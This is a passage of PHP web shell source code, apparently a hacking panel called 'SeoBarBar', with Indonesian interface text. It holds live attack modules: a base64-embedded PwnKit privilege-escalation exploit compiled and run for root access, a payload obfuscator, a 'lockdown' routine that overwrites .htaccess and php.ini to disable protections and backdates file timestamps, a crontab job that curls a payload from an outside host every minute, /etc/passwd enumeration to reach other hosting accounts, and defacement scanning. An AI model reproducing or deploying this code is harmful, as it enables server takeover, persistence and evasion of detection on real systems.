    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("cp-crack").'><center>Cpanel Crack</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("smtp-grab").'><center>SMTP Grabber</center></a></td>	
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("domains").'><center>Domains Viewer</center></a></td>
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("whmcs-decoder").'><center>WHMCS Decoder</center></a></td>	
    <td><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("delete-logs").'><center>Delete Logs</center></a></td>
</tr>
</table>
<br><hr>';}elseif(isset($_GET[hex('ENC')])){function maricode($string){$result='';for($index=0;$index<strlen($string);$index+=1)$result.=chr(ord($string[$index])+1);return $result;}echo '	<br><br>
				<h2> SeoBarBar Encryption </h2>
				<form action="" method="post">
					<textarea class= "form-control rounded-0" style="min-width: 96%; height: 200px;" name="encrypt"></textarea><br>
					<input class = "form-control rounded-0" type="submit" name="crypt" style="width: 250px;margin: 0 auto; " value="Crypt it!">
				</form><br>

				';if(isset($_POST['crypt'])&&isset($_POST['encrypt'])){$isi=$_POST['encrypt'];$isi2=maricode($isi);$isi3=base64_encode($isi2);$isifinal="function marinocode(\$maristring) { \$mariresult = ''; for (\$marindex = 0;\$marindex < strlen(\$maristring);\$marindex += 1) \$mariresult .= chr(ord(\$maristring[\$marindex]) - 1); return \$mariresult; } \$maricodeok = marinocode(base64_decode('".$isi3."')); call_user_func(create_function('', \$maricodeok));";echo "

";echo "<div class='form-group'>
  <center><label for='exampleFormControlTextarea1'>Hasil Encrypt PHP < 7.2 Only</label></center>
  <textarea class='form-control rounded-0' rows='10'>".$isifinal."</textarea></div>";}}elseif(isset($_GET[hex('r00t')])){function mari_rootc(){$privesc="LyoKICogUHJvb2Ygb2YgQ29uY2VwdCBmb3IgUHduS2l0OiBMb2NhbCBQcml2aWxlZ2UgRXNjYWxhdGlvbiBWdWxuZXJhYmlsaXR5IERpc2NvdmVyZWQgaW4gcG9sa2l04oCZcyBwa2V4ZWMgKENWRS0yMDIxLTQwMzQpIGJ5IEFuZHJpcyBSYXVndWxpcyA8bW9vQGFydGhlcHN5LmV1PgogKiBBZHZpc29yeTogaHR0cHM6Ly9ibG9nLnF1YWx5cy5jb20vdnVsbmVyYWJpbGl0aWVzLXRocmVhdC1yZXNlYXJjaC8yMDIyLzAxLzI1L3B3bmtpdC1sb2NhbC1wcml2aWxlZ2UtZXNjYWxhdGlvbi12dWxuZXJhYmlsaXR5LWRpc2NvdmVyZWQtaW4tcG9sa2l0cy1wa2V4ZWMtY3ZlLTIwMjEtNDAzNAogKi8KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKY2hhciAqc2hlbGwgPSAKCSIjaW5jbHVkZSA8c3RkaW8uaD5cbiIKCSIjaW5jbHVkZSA8c3RkbGliLmg+XG4iCgkiI2luY2x1ZGUgPHVuaXN0ZC5oPlxuXG4iCgkidm9pZCBnY29udigpIHt9XG4iCgkidm9pZCBnY29udl9pbml0KCkge1xuIgoJIglzZXR1aWQoMCk7IHNldGdpZCgwKTtcbiIKCSIJc2V0ZXVpZCgwKTsgc2V0ZWdpZCgwKTtcbiIKCSIJc3lzdGVtKFwiZXhwb3J0IFBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluOyBybSAtcmYgJ0dDT05WX1BBVEg9LicgJ3B3bmtpdCc7IGNob3duIHJvb3Q6cm9vdCBtYVJpOyBjaG1vZCA0Nzc3IG1hUmk7IC9iaW4vc2hcIik7XG4iCgkiCWV4aXQoMCk7XG4iCgkifSI7CgpjaGFyICpnZXRyb290ID0gCgkiI2luY2x1ZGUgPHVuaXN0ZC5oPlxuIgoJIiNpbmNsdWRlIDxzdGRpby5oPlxuIgoJImludCBtYWluICh2b2lkKVxuIgoJIntcbiIKCSIJc2V0Z2lkKDApO1xuIgoJIglzZXR1aWQoMCk7XG4iCgkiCXN5c3RlbShcIi9iaW4vYmFzaFwiKTtcbiIKCSIJcmV0dXJuIDA7XG4iCgkifSI7CgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKSB7CglGSUxFICpmcDsKCUZJTEUgKmdyOwoJc3lzdGVtKCJta2RpciAtcCAnR0NPTlZfUEFUSD0uJzsgdG91Y2ggJ0dDT05WX1BBVEg9Li9wd25raXQnOyBjaG1vZCBhK3ggJ0dDT05WX1BBVEg9Li9wd25raXQnIik7CglzeXN0ZW0oIm1rZGlyIC1wIHB3bmtpdDsgZWNobyAnbW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDInID4gcHdua2l0L2djb252LW1vZHVsZXMiKTsKCWZwID0gZm9wZW4oInB3bmtpdC9wd25raXQuYyIsICJ3Iik7CglmcHJpbnRmKGZwLCAiJXMiLCBzaGVsbCk7CglmY2xvc2UoZnApOwoKCWdyID0gZm9wZW4oImdldHJvb3QuYyIsICJ3Iik7CglmcHJpbnRmKGdyLCAiJXMiLCBnZXRyb290KTsKCWZjbG9zZShncik7CgoJc3lzdGVtKCJnY2MgZ2V0cm9vdC5jIC1vIG1hUmkiKTsKCglzeXN0ZW0oImdjYyBwd25raXQvcHdua2l0LmMgLW8gcHdua2l0L3B3bmtpdC5zbyAtc2hhcmVkIC1mUElDIik7CgljaGFyICplbnZbXSA9IHsgInB3bmtpdCIsICJQQVRIPUdDT05WX1BBVEg9LiIsICJDSEFSU0VUPVBXTktJVCIsICJTSEVMTD1wd25raXQiLCBOVUxMIH07CglleGVjdmUoIi91c3IvYmluL3BrZXhlYyIsIChjaGFyKltdKXtOVUxMfSwgZW52KTsKfQ==";$fp=file_put_contents('prvesc.c',base64_decode($privesc));return True;}function r00t_py(){$rootshell="IyEvYmluL3B5dGhvbgojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQpmcm9tICAgIHN1YnByb2Nlc3MgaW1wb3J0IFBvcGVuLCBQSVBFLCBTVERPVVQKaW1wb3J0ICB0aW1lCmltcG9ydCAgb3MKaW1wb3J0ICBzeXMKIApleHBsb2l0ID0gJy4vbWFSaScKY21kcyAgICA9IHN5cy5hcmd2WzFdCiAKcCA9IFBvcGVuKFtleHBsb2l0LCAnJ10sIHN0ZG91dD1QSVBFLCBzdGRpbj1QSVBFLCBzdGRlcnI9U1RET1VUKQpwcmludChzdHIocC5jb21tdW5pY2F0ZShjbWRzKVswXSkp";$fp=fopen('maRiPY',"w");fwrite($fp,base64_decode($rootshell));fclose($fp);return True;}if(!function_exists('posix_getegid')){$user=@get_current_user();$uid=@getmyuid();$gid=@getmygid();$group="?";}else{$uid=@posix_getpwuid(posix_geteuid());$gid=@posix_getgrgid(posix_getegid());$user=$uid['name'];$uid=$uid['uid'];$group=$gid['name'];$gid=$gid['gid'];}$check_system=(exe('id'))?"<font color=green>ON</font>":"<font color=red>OFF</font>";$python=(exe('python --help'))?"<font color=green>ON</font>":"<font color=red>OFF</font>";$gcc=(exe('gcc --help'))?"<font color=green>ON</font>":"<font color=red>OFF</font>";$pkexec=(exe('pkexec --version'))?"<font color=green>ON</font>":"<font color=red>OFF</font>";$kernel=php_uname();echo "<br><br><center><h2>SeoBarBar r00t 4034 expLo</h2><br>";echo("SYSTEM: $kernel<br>");echo("UID/GID: $user ( $uid ) | $group ( $gid )<br>");echo("Shell Command: $check_system | GCC: $gcc | PYTHON: $python | PKEXEC: $pkexec</br>");exe('ls -al /usr/bin/pkexec');echo("<br><br>Pastikan bisa shell command, gcc, python, pkexec semua ON (IJO)!<br>");echo "<form method='POST' action=''>
				<input type='submit' class='btn btn-danger btn-lg' name='r00tx' value='HAJAR DISINI!'></input>
			</form></center>";if(isset($_POST['r00tx'])){$spawn_rootc=mari_rootc();if($spawn_rootc){if(file_exists('prvesc.c')){$gass=exe('gcc prvesc.c -o prvesc; chmod +x prvesc; ./prvesc');if(file_exists('maRi')){$makefile_rootshellpy=r00t_py();exe('python maRiPY "id;uname -a" 2>&1');echo("<center><h2>w00t, its r00t! >:)</h2></center>");exe('rm -rf *.c maRi maRiPY prvesc prvesc.c');}else{print('<center><h2>Can\'t root this server!</h2></center>');}}else{print('<center><h2>Can\'t write file!</h2></center>');}}}}elseif(isset($_GET[hex('processx')])){if(isset($_GET['pid'])){$s_p=$_GET['pid'];if(function_exists("posix_kill"))$s_buff=(posix_kill($s_p,'9'))?"Process with pid ".$s_p." has been successfully killed":"Unable to kill process with pid ".$s_p;else{if(!$s_win)$s_buff=exe("kill -9 ".$s_p);else $s_buff=exe("taskkill /F /PID ".$s_p);}}if(!$s_win){$s_h="ps aux";}else{$s_h="tasklist /V /FO csv";}$s_wcount=11;$s_wexplode=" ";if($s_win)$s_wexplode="\",\"";$s_res=exe($s_h);if(trim($s_res)=='')echo "<p class='notif'>Error getting process list</p>";else{if($s_buff!="")echo "<p class='notif'>".$s_buff."</p>";echo "<table class = 'table table-bordered mt-3 hoverTable'><thead>";if(!$s_win)$s_res=preg_replace('#\ +#',' ',$s_res);$s_psarr=explode("
",$s_res);$s_fi=true;$s_tblcount=0;$s_check=explode($s_wexplode,$s_psarr[0]);$s_wcount=count($s_check);foreach($s_psarr as $s_psa){if(trim($s_psa)!=''){if($s_fi){$s_fi=false;$s_psln=explode($s_wexplode,$s_psa,$s_wcount);echo "<tr><th style='text-align:center;'>Action</th>";foreach($s_psln as $s_p)echo "<th style='text-align:center;'>".trim(trim(strtolower($s_p)),"\"")."</th>";echo "</tr>";}else{$s_psln=explode($s_wexplode,$s_psa,$s_wcount);echo "<tr>";$s_tblcount=0;foreach($s_psln as $s_p){if(trim($s_p)=="")$s_p=" ";if($s_tblcount==0){echo "<td style='text-align:center;'><a class='form-control ajx' href='?d=".hex($d)."&".hex("processx")."&pid=".trim(trim($s_psln[1]),"\"")."'>Kill</a></td>
										<td style='text-align:center;'>".trim(trim($s_p),"\"")."</td>";$s_tblcount++;}else{$s_tblcount++;if($s_tblcount==count($s_psln))echo "<td style='text-align:center;'>".trim(trim($s_p),"\"")."</td>";else echo "<td style='text-align:center;'>".trim(trim($s_p),"\"")."</td>";}}echo "</tr>";}}}echo "</thead></table>";}}elseif(isset($_GET[hex('Lockdown')])){error_reporting(0);set_time_limit(0); ?><form method="post"action=""><center><hr><br><h2>Lockdown SeoBarBar</h2><br><u>Jenis :</u> <select class="form-control"name="jenislock"style="width:250px;height:40px"><option>--------SELECT--------</option><option value="wp"selected>Lockdown Wordpress</option><option value="web">Lockdown Web</option></select><br><input name="LockNow"value="Lock Now !"type="submit"class="form-control"style="width:250px;height:40px"></form><hr><br><span style="color:red"><?php if(isset($_POST['LockNow'])){$kunci=$_POST['jenislock'];$phpini=$_SERVER['DOCUMENT_ROOT']."/php.ini";$htaccess=$_SERVER['DOCUMENT_ROOT']."/.htaccess";$indexwp=$_SERVER['DOCUMENT_ROOT']."/index.php";$this_file=__FILE__;if($kunci==="wp"){$contentbb='T3B0aW9ucyAtSW5kZXhlcwo8RmlsZXNNYXRjaCAiLipcLihweXxzaHRtbHxwaHRtbHxwaHB8UEhQfFBocHxQSHB8cEhwfHBIUHxwaFB8UGhQfHBocDV8cGhwNykkIj4KT3JkZXIgQWxsb3csRGVueQpEZW55IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KPEZpbGVzTWF0Y2ggJ14oaW5kZXgucGhwfHdwLWxvZ2luLnBocHx4bWxycGMucGhwfGVkaXQtZm9ybS1hZHZhbmNlZC5waHB8bGluay1wYXJzZS1vcG1sLnBocHxtcy1zaXRlcy5waHB8b3B0aW9ucy13cml0aW5nLnBocHx0aGVtZXMucGhwfGh0dHBzLnBocHxjbGFzcy1odHRwcy5waHB8YWRtaW4tYWpheC5waHB8ZWRpdC1mb3JtLWNvbW1lbnQucGhwfGxpbmsucGhwfG1zLXRoZW1lcy5waHB8bWFyaS5waHB8cGx1Z2luLWVkaXRvci5waHB8YWRtaW4tZm9vdGVyLnBocHxlZGl0LWxpbmstZm9ybS5waHB8bG9hZC1zY3JpcHRzLnBocHxtcy11cGdyYWRlLW5ldHdvcmsucGhwfGFkbWluLWZ1bmN0aW9ucy5waHB8ZWRpdC5waHB8bG9hZC1zdHlsZXMucGhwfG1zLXVzZXJzLnBocHxwbHVnaW5zLnBocHxhZG1pbi1oZWFkZXIucGhwfGxpY2Vuc2VzLnBocHxlZGl0LXRhZy1mb3JtLnBocHxtZWRpYS1uZXcucGhwfG15LXNpdGVzLnBocHxhcHBzLnBocHxwb3N0LW5ldy5waHB8dXBncmFkZS10aGVtZXMucGhwfHNhbmR3aWNoLnBocHxlZGl0LXRhZ3MucGhwfG1lZGlhLnBocHxuYXYtbWVudXMucGhwfHBvc3RzLnBocHxhZG1pbi1wb3N0LnBocHxtYXJpZG9uby5waHB8ZXhwb3J0LnBocHxOb3RlLnBocHxtZWRpYS11cGxvYWQucGhwfG5ldHdvcmsucGhwfHByZXNzLXRoaXMucGhwfHVwbG9hZC5waHB8YXN5bmMtdXBsb2FkLnBocHxtZW51LWhlYWRlci5waHB8b3B0aW9ucy1kaXNjdXNzaW9uLnBocHxwcml2YWN5LnBocHx1c2VyLWVkaXQucGhwfG1lbnUucGhwfG9wdGlvbnMtZ2VuZXJhbC5waHB8cHJvZmlsZS5waHB8bm9vcC5waHB8cmVnaXN0cmF0aW9uLWZ1bmN0aW9ucy5waHB8dXNlci1uZXcucGhwfG1vZGVyYXRpb24ucGhwfG9wdGlvbnMtaGVhZC5waHB8cmV2aXNpb24ucGhwfHVzZXJzLnBocHxjdXN0b20tYmFja2dyb3VuZC5waHB8bXMtYWRtaW4ucGhwfG9wdGlvbnMtbWVkaWEucGhwfHNldHVwLWNvbmZpZy5waHB8Y2xhc3Mtd3AtY3VzdG9taXplLW5hdi1tZW51LWN1c3RvbWl6ZS5waHB8d2lkZ2V0cy5waHB8dGhlbWUtc2luZ2xlLnBocHxjdXN0b20taGVhZGVyLnBocHxtcy1kZWxldGUtc2l0ZS5waHB8b3B0aW9ucy1wZXJtYWxpbmsucGhwfHRlcm0ucGhwfGN1c3RvbWl6ZS5waHB8bGluay1hZGQucGhwfHN1cHJlLnBocHxtcy1lZGl0LnBocHxvcHRpb25zLnBocHxlZGl0LWNvbW1lbnRzLnBocHxsaW5rLW1hbmFnZXIucGhwfG1zLW9wdGlvbnMucGhwfG9wdGlvbnMtcmVhZGluZy5waHB8eG1scnBjLnBocHxjb21tZW50cy5waHB8ZnJvbnQtcGFnZS5waHB8aG9tZS5waHB8aGVhZGVyLnBocHxzaW5ndWxhci5waHB8c2luZ2xlLnBocHxzaW5nbGUtd29yZHByZXNzLnBocHxwYWdlLnBocHxjYXRlZ29yeS5waHB8dGFnLnBocHx0YXhvbm9teS5waHB8YXV0aG9yLnBocHxkYXRlLnBocHxhcmNoaXZlLnBocHxzZWFyY2gucGhwfGF0dGFjaG1lbnQucGhwfGltYWdlLnBocHw0MDQucGhwKSQnPgpPcmRlciBhbGxvdyxkZW55CkFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KIyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4KUmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgojIEVORA==';$indexphp='PD9waHAKLyoqCiAqIEZyb250IHRvIHRoZSBXb3JkUHJlc3MgYXBwbGljYXRpb24uIFRoaXMgZmlsZSBkb2Vzbid0IGRvIGFueXRoaW5nLCBidXQgbG9hZHMKICogd3AtYmxvZy1oZWFkZXIucGhwIHdoaWNoIGRvZXMgYW5kIHRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSB0aGVtZS4KICoKICogQHBhY2thZ2UgV29yZFByZXNzCiAqLwoKLyoqCiAqIFRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSBXb3JkUHJlc3MgdGhlbWUgYW5kIG91dHB1dCBpdC4KICoKICogQHZhciBib29sCiAqLwpkZWZpbmUoICdXUF9VU0VfVEhFTUVTJywgdHJ1ZSApOwoKLyoqIExvYWRzIHRoZSBXb3JkUHJlc3MgRW52aXJvbm1lbnQgYW5kIFRlbXBsYXRlICovCnJlcXVpcmUgX19ESVJfXyAuICcvd3AtYmxvZy1oZWFkZXIucGhwJzs=';$indexphp=base64_decode($indexphp);if(file_exists($indexwp)){$indexphp_content=mari_get_contents($indexwp);if($indexphp==$indexphp_content){echo "index.php sama ..<br>";echo "Chmod 444 index.php<br>";chmod($indexwp,0444);}else{echo "Chmod 777 index.php<br>";chmod($indexwp,0777);echo "Hapus index.php<br>";unlink($indexwp);echo "Tambahkan index.php baru<br>";file_put_contents($indexwp,$indexphp);echo "Chmod 444 index.php<br>";chmod($indexwp,0444);echo "Randomize index.php date<br>";touch($indexwp,strtotime('-'.rand(30,150).' days',time()));}}$contentaa=base64_decode($contentbb);if(file_exists($htaccess)){$htaccess_content=mari_get_contents($htaccess);if($contentaa!=$htaccess_content){echo "Chmod 777 htaccess<br>";chmod($htaccess,0777);echo "deleting htaccess<br>";unlink($htaccess);echo "Menambah htaccess baru<br>";file_put_contents($htaccess,$contentaa);}}$htaccessx=$direktori."/-./.htaccess";$contentxx1='QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRm';$contentxx=base64_decode($contentxx1);file_put_contents($htaccessx,$contentxx);file_put_contents($phpini,base64_decode("c2FmZV9tb2RlID0gT2ZmCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQpzYWZlX21vZGVfZ2lkID0gT0ZGCm9wZW5fYmFzZWRpciA9IE9GRgpleGVjID0gT04gCnNoZWxsX2V4ZWMgPSBPTg=="));echo "Inject PHP.ini bypass<br>";echo "Chmod 444 htaccess<br>";chmod($htaccess,0444);echo "Chmod 444 file ini<br>";chmod($this_file,0444);echo "Random waktu htaccess<br>";touch($htaccess,strtotime('-'.rand(30,150).' days',time()));echo "Random waktu file ini<br>";touch($this_file,strtotime('-'.rand(30,150).' days',time()));echo "All done!";$htaccess_content=mari_get_contents($htaccess);echo "<textarea readonly>".htmlspecialchars($htaccess_content)."</textarea>";}if($kunci==="web"){$content='T3B0aW9ucyAtSW5kZXhlcwo8RmlsZXNNYXRjaCAiLipcLihweXxzaHRtbHxwaHRtbHxwaHB8UEhQfFBocHxQSHB8cEhwfHBIUHxwaFB8UGhQfHBocDV8cGhwNykkIj4KT3JkZXIgQWxsb3csRGVueQpEZW55IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KPEZpbGVzTWF0Y2ggJ14oaW5kZXgucGhwfHdwLWxvZ2luLnBocHx4bWxycGMucGhwfGVkaXQtZm9ybS1hZHZhbmNlZC5waHB8bGluay1wYXJzZS1vcG1sLnBocHxtcy1zaXRlcy5waHB8b3B0aW9ucy13cml0aW5nLnBocHx0aGVtZXMucGhwfGh0dHBzLnBocHxjbGFzcy1odHRwcy5waHB8YWRtaW4tYWpheC5waHB8ZWRpdC1mb3JtLWNvbW1lbnQucGhwfGxpbmsucGhwfG1zLXRoZW1lcy5waHB8bWFyaS5waHB8cGx1Z2luLWVkaXRvci5waHB8YWRtaW4tZm9vdGVyLnBocHxlZGl0LWxpbmstZm9ybS5waHB8bG9hZC1zY3JpcHRzLnBocHxtcy11cGdyYWRlLW5ldHdvcmsucGhwfGFkbWluLWZ1bmN0aW9ucy5waHB8ZWRpdC5waHB8bG9hZC1zdHlsZXMucGhwfG1zLXVzZXJzLnBocHxwbHVnaW5zLnBocHxhZG1pbi1oZWFkZXIucGhwfGxpY2Vuc2VzLnBocHxlZGl0LXRhZy1mb3JtLnBocHxtZWRpYS1uZXcucGhwfG15LXNpdGVzLnBocHxhcHBzLnBocHxwb3N0LW5ldy5waHB8dXBncmFkZS10aGVtZXMucGhwfHNhbmR3aWNoLnBocHxlZGl0LXRhZ3MucGhwfG1lZGlhLnBocHxuYXYtbWVudXMucGhwfHBvc3RzLnBocHxhZG1pbi1wb3N0LnBocHxtYXJpZG9uby5waHB8ZXhwb3J0LnBocHxOb3RlLnBocHxtZWRpYS11cGxvYWQucGhwfG5ldHdvcmsucGhwfHByZXNzLXRoaXMucGhwfHVwbG9hZC5waHB8YXN5bmMtdXBsb2FkLnBocHxtZW51LWhlYWRlci5waHB8b3B0aW9ucy1kaXNjdXNzaW9uLnBocHxwcml2YWN5LnBocHx1c2VyLWVkaXQucGhwfG1lbnUucGhwfG9wdGlvbnMtZ2VuZXJhbC5waHB8cHJvZmlsZS5waHB8bm9vcC5waHB8cmVnaXN0cmF0aW9uLWZ1bmN0aW9ucy5waHB8dXNlci1uZXcucGhwfG1vZGVyYXRpb24ucGhwfG9wdGlvbnMtaGVhZC5waHB8cmV2aXNpb24ucGhwfHVzZXJzLnBocHxjdXN0b20tYmFja2dyb3VuZC5waHB8bXMtYWRtaW4ucGhwfG9wdGlvbnMtbWVkaWEucGhwfHNldHVwLWNvbmZpZy5waHB8Y2xhc3Mtd3AtY3VzdG9taXplLW5hdi1tZW51LWN1c3RvbWl6ZS5waHB8d2lkZ2V0cy5waHB8dGhlbWUtc2luZ2xlLnBocHxjdXN0b20taGVhZGVyLnBocHxtcy1kZWxldGUtc2l0ZS5waHB8b3B0aW9ucy1wZXJtYWxpbmsucGhwfHRlcm0ucGhwfGN1c3RvbWl6ZS5waHB8bGluay1hZGQucGhwfHN1cHJlLnBocHxtcy1lZGl0LnBocHxvcHRpb25zLnBocHxlZGl0LWNvbW1lbnRzLnBocHxsaW5rLW1hbmFnZXIucGhwfG1zLW9wdGlvbnMucGhwfG9wdGlvbnMtcmVhZGluZy5waHB8eG1scnBjLnBocHxjb21tZW50cy5waHB8ZnJvbnQtcGFnZS5waHB8aG9tZS5waHB8aGVhZGVyLnBocHxzaW5ndWxhci5waHB8c2luZ2xlLnBocHxzaW5nbGUtd29yZHByZXNzLnBocHxwYWdlLnBocHxjYXRlZ29yeS5waHB8dGFnLnBocHx0YXhvbm9teS5waHB8YXV0aG9yLnBocHxkYXRlLnBocHxhcmNoaXZlLnBocHxzZWFyY2gucGhwfGF0dGFjaG1lbnQucGhwfGltYWdlLnBocHw0MDQucGhwKSQnPgpPcmRlciBhbGxvdyxkZW55CkFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KIyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4KUmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgojIEVORA==';$content=base64_decode($content);if(file_exists($htaccess)){$htaccess_content=mari_get_contents($htaccess);if($content!=$htaccess_content){echo "Chmod 777 htaccess<br>";@chmod($htaccess,0777);echo "deleting htaccess<br>";@unlink($htaccess);echo "Menambah htaccess baru<br>";@file_put_contents($htaccess,$content);}}$htaccessx=$direktori."/-./.htaccess";$contentxx1='QWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAucGRm';$contentxx=base64_decode($contentxx1);file_put_contents($htaccessx,$contentxx);file_put_contents($phpini,base64_decode("c2FmZV9tb2RlID0gT2ZmCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQpzYWZlX21vZGVfZ2lkID0gT0ZGCm9wZW5fYmFzZWRpciA9IE9GRgpleGVjID0gT04gCnNoZWxsX2V4ZWMgPSBPTg=="));echo "Inject PHP.ini bypass<br>";echo "Chmod 444 htaccess<br>";chmod($htaccess,0444);echo "Chmod 444 file ini<br>";chmod($this_file,0444);echo "Random waktu htaccess<br>";touch($htaccess,strtotime('-'.rand(30,150).' days',time()));echo "Random waktu file ini<br>";touch($this_file,strtotime('-'.rand(30,150).' days',time()));echo "All done!";$htaccess_content=mari_get_contents($htaccess);echo "<textarea readonly>".htmlspecialchars($htaccess_content)."</textarea>";}} ?></span><?php }elseif(isset($_GET[hex('crontab')])){echo "<hr><br><center>
		<h2>Crontab SeoBarBar</h2></center>";echo "<center>
		<form method='post'>
		<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						
						</div>						
						<div class = 'col-md-3'>
						<input  class = 'form-control col-md-4' style='width:250px; height:40px; 'type='submit' name='go' value='Pasang!'>
						</div>
						<div class = 'col-md-3'>
						<input  class = 'form-control col-md-4' style='width:250px; height:40px; 'type='submit' name='hapus' value='Hapus!'>
						</div>
						
		</div>
		
		
		
	
		</form><hr><br></center>";if(isset($_POST['list'])){echo "Hi!";}if(isset($_POST['go'])){if(!is_dir($_SERVER['DOCUMENT_ROOT'].'/.well-known/')){mkdir($_SERVER['DOCUMENT_ROOT'].'/.well-known/',0755,true);}exe("(crontab -l 2>/dev/null; echo \"* * * * * curl --silent https://m.slotao.com/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/SeoBarBar.php\") | crontab -");echo "<br>Link: <a href='//".$_SERVER['HTTP_HOST']."/.well-known/maridono.php' target='_blank'>".$_SERVER['HTTP_HOST']."/.well-known/maridono.php</a> defense tiap menit! ";echo "<br>Done!";}if(isset($_POST['hapus'])){exe("(crontab -l 2>/dev/null | grep -v \"curl --silent https://m.slotao.com/logo.png > ".$_SERVER['DOCUMENT_ROOT']."/.well-known/maridono.php\") | crontab -");}}elseif(isset($_GET[hex('jumping')])){echo "<hr><br><center><h2>Jumping MARIdoNO</h2>";echo "<form method = 'POST' action = ''>";echo "<input type = 'submit' name = 'jump' class='form-control' style='width:250px;height:40px;' value = 'Jump!'> ";echo "<hr><br></center>";if(isset($_POST['jump'])){$i=0;echo "<pre><div class='margin: 5px auto;'>";$etc=fopen("/etc/passwd","r")or die("<font color=red>Can't read /etc/passwd</font>");while($passwd=fgets($etc)){if($passwd==''||!$etc){echo "<font color=red>Can't read /etc/passwd</font>";}else{preg_match_all('/(.*?):x:/',$passwd,$user_jumping);foreach($user_jumping[1]as $user_Exc_jump){$user_jumping_dir="/home/$user_Exc_jump/public_html";if(is_readable($user_jumping_dir)){$i++;$jrw="[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";if(is_writable($user_jumping_dir)){$jrw="[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";}echo $jrw;if(function_exists('posix_getpwuid')){$domain_jump=mari_get_contents("/etc/named.conf");if($domain_jump==''){echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";}else{preg_match_all("#/var/named/(.*?).db#",$domain_jump,$domains_jump);foreach($domains_jump[1]as $dj){$user_jumping_url=posix_getpwuid(@fileowner("/etc/valiases/$dj"));$user_jumping_url=$user_jumping_url['name'];if($user_jumping_url==$user_Exc_jump){echo" => ( <u>$dj</u> )<br>";break;}}}}else{echo "<br>";}}}}}if($i==0){}else{echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";}echo "</div></pre>";}}elseif(isset($_GET[hex('fake-root')])){ob_start();if(!preg_match("#/home/$user/public_html#",$_SERVER['DOCUMENT_ROOT']))die("I Think this server is not using shared host ");function reverse($url){$ch=curl_init("http://domains.yougetsignal.com/domains.php");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"remoteAddress=$url&ket=");curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_POST,1);$resp=curl_exec($ch);$resp=str_replace("[","",str_replace("]","",str_replace("\"\"","",str_replace(", ,",",",str_replace("{","",str_replace("{","",str_replace("}","",str_replace(", ",",",str_replace(", ",",",str_replace("'","",str_replace("'","",str_replace(":",",",str_replace('"','',$resp)))))))))))));$array=explode(",,",$resp);unset($array[0]);foreach($array as $lnk){$lnk="http://$lnk";$lnk=str_replace(",","",$lnk);echo $lnk."
";ob_flush();flush();}curl_close($ch);}function cek($url){$ch=curl_init($url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);$resp=curl_exec($ch);return $resp;}$cwd=getcwd();$ambil_user=explode("/",$cwd);$user=$ambil_user[2];if($_POST['reverse']){$site=explode("
",$_POST['url']);$file=$_POST['file'];foreach($site as $url){$cek=cek("$url/~$user/$file");if(preg_match("/hacked/i",$cek)){echo"URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";}}}else{echo"<hr><br><center><h2>Fake Root SeoBarBar</h2><form method='post'>
		Filename: <br><input class='form-control' type='text' name='file' value='deface.html' style='width:300px;height:40px;'><br>
		User: <br><input class='form-control' type='text' value='$user' size='50' height='10' readonly style='width:300px;height:40px;'><br>
		Domain: <br>
		<textarea class='form-control' style='width: 450px; height: 250px;' name='url'>";reverse($_SERVER['HTTP_HOST']);echo "</textarea><br>
		<input class='form-control' type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
